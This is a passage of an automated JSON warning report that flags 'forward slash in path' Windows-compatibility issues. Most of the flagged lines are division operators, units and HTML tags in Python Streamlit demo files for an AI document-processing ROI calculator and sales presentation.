        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\benchmark_showcase.py",
        "warning": "Line 705: Forward slash in path - \">\n            <h3>💰 Cost</h3>\n            <h2>$0.03/doc</h2>\n            <div class=\"",
        "timestamp": "2025-09-05T17:30:42.155554"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\benchmark_showcase.py",
        "warning": "Line 708: Forward slash in path - ']:.0f}% Cost Reduction</div>\n        </div>\n        \"",
        "timestamp": "2025-09-05T17:30:42.155579"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\benchmark_showcase.py",
        "warning": "Line 714: Forward slash in path - \">\n            <h3>🏆 Overall</h3>\n            <h2>Superior</h2>\n            <div class=\"",
        "timestamp": "2025-09-05T17:30:42.155606"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\benchmark_showcase.py",
        "warning": "Line 717: Forward slash in path - ']:.0f}% Better</div>\n        </div>\n        \"",
        "timestamp": "2025-09-05T17:30:42.155631"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\benchmark_showcase.py",
        "warning": "Line 758: Forward slash in path - \"🥇 **Speed**: 150 docs/min\"",
        "timestamp": "2025-09-05T17:30:42.155675"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\benchmark_showcase.py",
        "warning": "Line 759: Forward slash in path - \"🥇 **Cost Efficiency**: $0.03/doc\"",
        "timestamp": "2025-09-05T17:30:42.155701"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\benchmark_showcase.py",
        "warning": "Line 779: Forward slash in path - \"**Support**: 24/7 technical support with 99.9% SLA\"",
        "timestamp": "2025-09-05T17:30:42.155740"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\benchmark_showcase.py",
        "warning": "Line 874: Forward slash in path - ']} docs/min\"",
        "timestamp": "2025-09-05T17:30:42.155814"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\benchmark_showcase.py",
        "warning": "Line 905: Forward slash in path - \"Documents/Min\"",
        "timestamp": "2025-09-05T17:30:42.155864"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\benchmark_showcase.py",
        "warning": "Line 914: Forward slash in path - \"Documents/Min\"",
        "timestamp": "2025-09-05T17:30:42.155895"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\benchmark_showcase.py",
        "warning": "Line 935: Forward slash in path - \"Small (5K docs/month)\"",
        "timestamp": "2025-09-05T17:30:42.155933"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\benchmark_showcase.py",
        "warning": "Line 936: Forward slash in path - \"Medium (25K docs/month)\"",
        "timestamp": "2025-09-05T17:30:42.155962"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\benchmark_showcase.py",
        "warning": "Line 937: Forward slash in path - \"Large (100K docs/month)\"",
        "timestamp": "2025-09-05T17:30:42.155992"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\benchmark_showcase.py",
        "warning": "Line 985: Forward slash in path - \",\n            min_value=1.0,\n            max_value=10.0,\n            value=6.15,\n            step=0.05\n        )\n        \n        # Calculate ROI\n        annual_processing = monthly_docs * 12\n        \n        current_annual_cost = annual_processing * current_cost_per_doc\n        our_annual_cost = (annual_processing * 0.03) + (15000 * 12) + 125000\n        \n        annual_savings = current_annual_cost - our_annual_cost\n        roi_percentage = (annual_savings / our_annual_cost) * 100\n        payback_months = our_annual_cost / (annual_savings / 12)\n        \n        st.metric(\"",
        "timestamp": "2025-09-05T17:30:42.156051"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\benchmark_showcase.py",
        "warning": "Line 1108: Forward slash in path - \"24/7 enterprise support\"",
        "timestamp": "2025-09-05T17:30:42.156135"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\benchmark_showcase.py",
        "warning": "Line 1156: Forward slash in path - \"+{our_accuracy_trend:.2f}pp/year\"",
        "timestamp": "2025-09-05T17:30:42.156194"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\benchmark_showcase.py",
        "warning": "Line 1157: Forward slash in path - \"+{our_speed_trend:.1f} docs/min/year\"",
        "timestamp": "2025-09-05T17:30:42.156229"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\benchmark_showcase.py",
        "warning": "Line 1158: Forward slash in path - \"+{comp_a_accuracy_trend:.2f}pp/year\"",
        "timestamp": "2025-09-05T17:30:42.156264"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\benchmark_showcase.py",
        "warning": "Line 1159: Forward slash in path - \"+{comp_a_speed_trend:.1f} docs/min/year\"",
        "timestamp": "2025-09-05T17:30:42.156299"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\business_calculator.py",
        "warning": "Line 149: Forward slash in path - \"] - current_accuracy) / 100\n        error_reduction = annual_docs * (current_accuracy / 100 - self.base_metrics[\"",
        "timestamp": "2025-09-05T17:30:42.156940"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\business_calculator.py",
        "warning": "Line 150: Forward slash in path - \"] / 100)\n        error_savings = abs(error_reduction) * self.base_metrics[\"",
        "timestamp": "2025-09-05T17:30:42.156954"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\business_calculator.py",
        "warning": "Line 151: Forward slash in path - \"]\n        \n        # Time savings calculation\n        current_processing_time = annual_docs / (self.base_metrics[\"",
        "timestamp": "2025-09-05T17:30:42.156965"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\business_calculator.py",
        "warning": "Line 154: Forward slash in path - \"] * 60)  # hours\n        ai_processing_time = annual_docs / (self.base_metrics[\"",
        "timestamp": "2025-09-05T17:30:42.156975"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\business_calculator.py",
        "warning": "Line 179: Forward slash in path - \"]\n            year_subscription = ai_annual_subscription\n            year_current_cost = year_docs * current_cost_per_doc\n            \n            # Benefits\n            year_processing_savings = year_current_cost - year_ai_processing - year_subscription\n            year_error_savings = abs(year_docs * (current_accuracy / 100 - self.base_metrics[\"",
        "timestamp": "2025-09-05T17:30:42.157006"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\business_calculator.py",
        "warning": "Line 185: Forward slash in path - \"] / 100)) * self.base_metrics[\"",
        "timestamp": "2025-09-05T17:30:42.157017"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\business_calculator.py",
        "warning": "Line 185: Forward slash in path - \"]\n            year_time_savings = (year_docs / (self.base_metrics[\"",
        "timestamp": "2025-09-05T17:30:42.157030"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\business_calculator.py",
        "warning": "Line 186: Forward slash in path - \"] * 60) - \n                                year_docs / (self.base_metrics[\"",
        "timestamp": "2025-09-05T17:30:42.157041"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\business_calculator.py",
        "warning": "Line 189: Forward slash in path - \"]\n            \n            total_year_benefits = (year_processing_savings + year_error_savings + \n                                 year_time_savings + year_productivity_savings + year_compliance_savings)\n            \n            # Net present value calculation\n            npv_benefits = total_year_benefits / (1 + discount_rate) ** year\n            npv_costs = (year_ai_processing + year_subscription) / (1 + discount_rate) ** year\n            \n            cumulative_savings += npv_benefits\n            cumulative_costs += npv_costs\n            \n            yearly_analysis.append({\n                \"",
        "timestamp": "2025-09-05T17:30:42.157075"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\business_calculator.py",
        "warning": "Line 215: Forward slash in path - \"] for y in yearly_analysis)\n        total_npv_costs = cumulative_costs\n        net_npv = total_npv_benefits - total_npv_costs\n        roi_percentage = (net_npv / total_npv_costs) * 100 if total_npv_costs > 0 else 0\n        \n        # Payback period calculation\n        payback_months = 0\n        running_total = -total_implementation_cost\n        for year_data in yearly_analysis:\n            monthly_benefit = year_data[\"",
        "timestamp": "2025-09-05T17:30:42.157103"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\business_calculator.py",
        "warning": "Line 224: Forward slash in path - \"] / 12\n            for month in range(12):\n                running_total += monthly_benefit / 12  # Assume even monthly distribution\n                payback_months += 1\n                if running_total >= 0:\n                    break\n            if running_total >= 0:\n                break\n        \n        return {\n            \"",
        "timestamp": "2025-09-05T17:30:42.157120"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\business_calculator.py",
        "warning": "Line 277: Forward slash in path - \":\n                    roi_impact = (value / 25000) * base_roi  # Normalize to base case\n                elif variable == \"",
        "timestamp": "2025-09-05T17:30:42.157166"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\business_calculator.py",
        "warning": "Line 279: Forward slash in path - \":\n                    cost_impact = (value - 6.15) / 6.15\n                    roi_impact = base_roi + (cost_impact * 50)  # Approximate impact\n                elif variable == \"",
        "timestamp": "2025-09-05T17:30:42.157184"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\business_calculator.py",
        "warning": "Line 505: Forward slash in path - '\n            ),\n            row=1, col=2\n        )\n        \n        # Annual savings\n        fig.add_trace(\n            go.Bar(\n                x=names,\n                y=[s/1000 for s in savings],  # Convert to thousands\n                name='",
        "timestamp": "2025-09-05T17:30:42.157314"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\business_calculator.py",
        "warning": "Line 516: Forward slash in path - '\n            ),\n            row=2, col=1\n        )\n        \n        # Implementation vs Benefits scatter\n        fig.add_trace(\n            go.Scatter(\n                x=[i/1000 for i in implementations],  # Convert to thousands\n                y=[s/1000 for s in savings],  # Convert to thousands\n                mode='",
        "timestamp": "2025-09-05T17:30:42.157351"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\business_calculator.py",
        "warning": "Line 552: Forward slash in path - \"\n    <style>\n    .calculator-header {\n        background: linear-gradient(135deg, #00b894 0%, #00cec9 100%);\n        padding: 2rem;\n        border-radius: 10px;\n        color: white;\n        text-align: center;\n        margin-bottom: 2rem;\n    }\n    .metric-positive {\n        color: #00b894;\n        font-weight: bold;\n    }\n    .metric-negative {\n        color: #d63031;\n        font-weight: bold;\n    }\n    .scenario-card {\n        background: white;\n        padding: 1.5rem;\n        border-radius: 10px;\n        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);\n        margin: 1rem 0;\n        border-left: 4px solid #00b894;\n    }\n    </style>\n    \"",
        "timestamp": "2025-09-05T17:30:42.157402"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\business_calculator.py",
        "warning": "Line 583: Forward slash in path - \">\n        <h1>💰 Business ROI Calculator</h1>\n        <h3>AI Document Intelligence Platform</h3>\n        <p>Calculate your ROI, analyze scenarios, and model business impact</p>\n    </div>\n    \"",
        "timestamp": "2025-09-05T17:30:42.157442"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\business_calculator.py",
        "warning": "Line 673: Forward slash in path - \"\n    ) / 100\n    \n    discount_rate = st.sidebar.slider(\n        \"",
        "timestamp": "2025-09-05T17:30:42.157500"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\business_calculator.py",
        "warning": "Line 682: Forward slash in path - \"\n    ) / 100\n    \n    # Calculate ROI\n    roi_data = calculator.calculate_comprehensive_roi(\n        monthly_docs=monthly_docs,\n        current_cost_per_doc=current_cost_per_doc,\n        current_accuracy=current_accuracy,\n        employees_affected=employees_affected,\n        industry=industry,\n        time_horizon_years=time_horizon,\n        growth_rate=growth_rate,\n        discount_rate=discount_rate\n    )\n    \n    # Main dashboard tabs\n    tab1, tab2, tab3, tab4 = st.tabs([\n        \"",
        "timestamp": "2025-09-05T17:30:42.157534"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\business_calculator.py",
        "warning": "Line 726: Forward slash in path - '><h3>ROI</h3><h2>{roi_data['",
        "timestamp": "2025-09-05T17:30:42.157570"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\business_calculator.py",
        "warning": "Line 726: Forward slash in path - ']:.1f}%</h2></div>\"",
        "timestamp": "2025-09-05T17:30:42.157594"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\business_calculator.py",
        "warning": "Line 731: Forward slash in path - '><h3>Payback</h3><h2>{roi_data['",
        "timestamp": "2025-09-05T17:30:42.157621"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\business_calculator.py",
        "warning": "Line 731: Forward slash in path - ']:.1f} months</h2></div>\"",
        "timestamp": "2025-09-05T17:30:42.157645"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\business_calculator.py",
        "warning": "Line 735: Forward slash in path - '><h3>Annual Savings</h3><h2>${roi_data['",
        "timestamp": "2025-09-05T17:30:42.157670"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\business_calculator.py",
        "warning": "Line 735: Forward slash in path - ']:,.0f}</h2></div>\"",
        "timestamp": "2025-09-05T17:30:42.157694"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\business_calculator.py",
        "warning": "Line 739: Forward slash in path - '><h3>Net NPV</h3><h2>${roi_data['",
        "timestamp": "2025-09-05T17:30:42.157719"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\business_calculator.py",
        "warning": "Line 739: Forward slash in path - ']:,.0f}</h2></div>\"",
        "timestamp": "2025-09-05T17:30:42.157744"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\business_calculator.py",
        "warning": "Line 743: Forward slash in path - '><h3>Time Saved</h3><h2>{roi_data['",
        "timestamp": "2025-09-05T17:30:42.157769"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\business_calculator.py",
        "warning": "Line 743: Forward slash in path - ']:,.0f} hrs</h2></div>\"",
        "timestamp": "2025-09-05T17:30:42.157794"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\business_calculator.py",
        "warning": "Line 773: Forward slash in path - \"] / benefits_df[\"",
        "timestamp": "2025-09-05T17:30:42.157831"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\business_calculator.py",
        "warning": "Line 877: Forward slash in path - \", 15.0) / 100,\n        \"",
        "timestamp": "2025-09-05T17:30:42.157917"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\business_calculator.py",
        "warning": "Line 878: Forward slash in path - \", 8.0) / 100\n    }\n    \n    all_scenarios = scenarios + [current_scenario]\n    \n    # Calculate comparison\n    comparison_data = calculator.compare_scenarios(all_scenarios)\n    \n    # Visualization\n    comparison_fig = calculator.create_scenario_comparison_chart(comparison_data)\n    st.plotly_chart(comparison_fig, use_container_width=True)\n    \n    col1, col2 = st.columns(2)\n    \n    with col1:\n        st.subheader(\"",
        "timestamp": "2025-09-05T17:30:42.157951"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\business_calculator.py",
        "warning": "Line 902: Forward slash in path - \">\n            <h4>🥇 Best Performing Scenario</h4>\n            <p><strong>{best['",
        "timestamp": "2025-09-05T17:30:42.157986"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\business_calculator.py",
        "warning": "Line 904: Forward slash in path - ']}</strong></p>\n            <p>ROI: <span class=\"",
        "timestamp": "2025-09-05T17:30:42.158015"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\business_calculator.py",
        "warning": "Line 905: Forward slash in path - ']:.1f}%</span></p>\n            <p>Annual Savings: <span class=\"",
        "timestamp": "2025-09-05T17:30:42.158045"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\business_calculator.py",
        "warning": "Line 906: Forward slash in path - ']:,.0f}</span></p>\n            <p>Payback: <span class=\"",
        "timestamp": "2025-09-05T17:30:42.158074"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\business_calculator.py",
        "warning": "Line 907: Forward slash in path - ']:.1f} months</span></p>\n        </div>\n        \"",
        "timestamp": "2025-09-05T17:30:42.158103"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\business_calculator.py",
        "warning": "Line 919: Forward slash in path - ']:,} docs/month\"",
        "timestamp": "2025-09-05T17:30:42.158137"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\business_calculator.py",
        "warning": "Line 927: Forward slash in path - \"Current Cost/Doc ($)\"",
        "timestamp": "2025-09-05T17:30:42.158170"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\business_calculator.py",
        "warning": "Line 992: Forward slash in path - \"±{impact_range/2:.1f}%\"",
        "timestamp": "2025-09-05T17:30:42.158238"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\business_calculator.py",
        "warning": "Line 1022: Forward slash in path - ']} Impact</span>\"",
        "timestamp": "2025-09-05T17:30:42.158287"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\business_calculator.py",
        "warning": "Line 1098: Forward slash in path - \"] / 12\n        break_even_months = implementation_cost / monthly_benefit if monthly_benefit > 0 else float('",
        "timestamp": "2025-09-05T17:30:42.158362"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\business_calculator.py",
        "warning": "Line 1103: Forward slash in path - \"]/12 - monthly_benefit)) for m in months[1:]]\n        cumulative_benefits = [0] + [m * monthly_benefit for m in months[1:]]\n        net_position = [b - c for b, c in zip(cumulative_benefits, [implementation_cost] * len(months))]\n        \n        fig_breakeven = go.Figure()\n        \n        fig_breakeven.add_trace(go.Scatter(\n            x=months,\n            y=cumulative_benefits,\n            mode='",
        "timestamp": "2025-09-05T17:30:42.158404"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\business_calculator.py",
        "warning": "Line 1143: Forward slash in path - '] / implementation_cost:.1f}x\"",
        "timestamp": "2025-09-05T17:30:42.158454"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\business_calculator.py",
        "warning": "Line 1179: Forward slash in path - \"${total_value / (roi_data['",
        "timestamp": "2025-09-05T17:30:42.158509"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\business_calculator.py",
        "warning": "Line 1180: Forward slash in path - \"${total_value / st.session_state.get('",
        "timestamp": "2025-09-05T17:30:42.158545"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\business_calculator.py",
        "warning": "Line 1219: Forward slash in path - \"🚀 **Phase 1**: Start with invoices and POs (highest volume/value)\"",
        "timestamp": "2025-09-05T17:30:42.158602"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\business_calculator.py",
        "warning": "Line 1246: Forward slash in path - ']}/min vs {calculator.base_metrics['",
        "timestamp": "2025-09-05T17:30:42.158654"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\business_calculator.py",
        "warning": "Line 1246: Forward slash in path - ']}/min (30x improvement)\n    - Accuracy Improvement: +{roi_data['",
        "timestamp": "2025-09-05T17:30:42.158691"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\interactive_presentation.py",
        "warning": "Line 122: Forward slash in path - \"30,000 invoices/month manual processing\"",
        "timestamp": "2025-09-05T17:30:42.159244"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\interactive_presentation.py",
        "warning": "Line 185: Forward slash in path - ']}</h1>\n            <h3>{slide['",
        "timestamp": "2025-09-05T17:30:42.159301"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\interactive_presentation.py",
        "warning": "Line 186: Forward slash in path - ']}</h3>\n        </div>\n        \"",
        "timestamp": "2025-09-05T17:30:42.159313"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\interactive_presentation.py",
        "warning": "Line 224: Forward slash in path - \">\n                    <h3>{icon}</h3>\n                    <h4>{metric}</h4>\n                </div>\n                \"",
        "timestamp": "2025-09-05T17:30:42.159351"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\interactive_presentation.py",
        "warning": "Line 298: Forward slash in path - '] / 100:.1f}B\"",
        "timestamp": "2025-09-05T17:30:42.159401"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\interactive_presentation.py",
        "warning": "Line 386: Forward slash in path - 'Processing Speed (docs/min)'",
        "timestamp": "2025-09-05T17:30:42.159463"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\interactive_presentation.py",
        "warning": "Line 536: Forward slash in path - \"\n                ]\n                \n                progress_container = st.container()\n                results_container = st.container()\n                \n                with progress_container:\n                    progress_bar = st.progress(0)\n                    status_text = st.empty()\n                    \n                    # Animate processing\n                    for i, stage in enumerate(stages):\n                        time.sleep(1.2)  # Simulate processing time\n                        progress_bar.progress((i + 1) / len(stages))\n                        accuracy = random.uniform(0.94, 0.99)\n                        status_text.markdown(f\"",
        "timestamp": "2025-09-05T17:30:42.159571"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\interactive_presentation.py",
        "warning": "Line 607: Forward slash in path - \"Throughput: 147 docs/min\"",
        "timestamp": "2025-09-05T17:30:42.159629"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\interactive_presentation.py",
        "warning": "Line 650: Forward slash in path - ',\n            marker=dict(\n                size=performance / 5,  # Size based on performance\n                color=performance,\n                colorscale='",
        "timestamp": "2025-09-05T17:30:42.159668"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\interactive_presentation.py",
        "warning": "Line 659: Forward slash in path - '%{text}<extra></extra>'",
        "timestamp": "2025-09-05T17:30:42.159693"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\interactive_presentation.py",
        "warning": "Line 858: Forward slash in path - \"CEO/Executive\"",
        "timestamp": "2025-09-05T17:30:42.159820"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\interactive_presentation.py",
        "warning": "Line 858: Forward slash in path - \"CFO/Finance\"",
        "timestamp": "2025-09-05T17:30:42.159845"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\interactive_presentation.py",
        "warning": "Line 858: Forward slash in path - \"CTO/Technical\"",
        "timestamp": "2025-09-05T17:30:42.159979"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\interactive_presentation.py",
        "warning": "Line 858: Forward slash in path - \"COO/Operations\"",
        "timestamp": "2025-09-05T17:30:42.160025"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\interactive_presentation.py",
        "warning": "Line 869: Forward slash in path - \"{slide_number}/{len(presentation.slides)}\"",
        "timestamp": "2025-09-05T17:30:42.160075"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\interactive_presentation.py",
        "warning": "Line 870: Forward slash in path - \"{(slide_number/len(presentation.slides)*100):.0f}%\"",
        "timestamp": "2025-09-05T17:30:42.160117"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\interactive_presentation.py",
        "warning": "Line 884: Forward slash in path - \"\n    <style>\n    .main-content {\n        padding: 1rem;\n    }\n    .slide-container {\n        background: white;\n        padding: 2rem;\n        border-radius: 15px;\n        box-shadow: 0 8px 16px rgba(0,0,0,0.1);\n        margin: 1rem 0;\n    }\n    .metric-highlight {\n        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);\n        color: white;\n        padding: 1rem;\n        border-radius: 10px;\n        text-align: center;\n        margin: 0.5rem 0;\n    }\n    </style>\n    \"",
        "timestamp": "2025-09-05T17:30:42.160176"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\interactive_presentation.py",
        "warning": "Line 905: Forward slash in path - \", unsafe_allow_html=True)\n    \n    # Get presentation controls\n    presentation, slide_index = create_presentation_controls()\n    \n    # Render current slide\n    with st.container():\n        presentation.render_slide(slide_index)\n    \n    # Slide progress indicator\n    progress = (slide_index + 1) / len(presentation.slides)\n    st.progress(progress)\n    \n    # Quick navigation at bottom\n    st.markdown(\"",
        "timestamp": "2025-09-05T17:30:42.160221"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\launch_ultimate_demo.py",
        "warning": "Line 119: Forward slash in path - \")\n            return False\n        \n        config = self.demo_configs[demo_name]\n        demo_file = self.demo_root / config[\"",
        "timestamp": "2025-09-05T17:30:42.160839"
      },
      {
        "category": "WINDOWS_COMPAT",
